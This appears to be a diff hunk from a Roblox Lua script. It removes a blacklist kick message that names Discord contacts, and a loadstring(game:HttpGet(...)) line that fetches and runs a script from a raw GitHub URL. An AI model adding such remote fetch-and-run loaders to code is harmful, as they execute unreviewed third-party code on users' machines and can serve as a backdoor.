@@ -227,9 +227,3 @@ game.Players.PlayerAdded:Connect(function(plr)
         end)
     end
 end)
-
-if game.Players.LocalPlayer.UserId == 0 then
-game.Players.LocalPlayer:Kick("Blacklisted | Please DM KaiW#4990 or FrostyW#9330 for help, If neither of them respond join our discord: .gg/C2eTqjK9dp")
-end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/Min/main/Skript"))()
